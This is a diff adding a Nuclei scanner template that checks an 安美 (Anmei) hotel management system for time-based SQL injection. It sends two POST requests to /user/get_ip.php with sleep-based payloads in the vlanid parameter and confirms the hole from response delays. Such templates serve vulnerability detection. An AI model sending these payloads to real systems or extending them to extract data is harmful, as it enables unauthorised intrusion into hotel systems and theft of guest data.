@@ -1,0 +1,33 @@
+id: anmeijiudian-get_ip-sql-time
+
+info:
+  name: 安美酒店管理系统/get_ip sql注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /user/get_ip.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z
+
+      - |
+        POST /user/get_ip.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(8)%2C0))XOR'Z
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
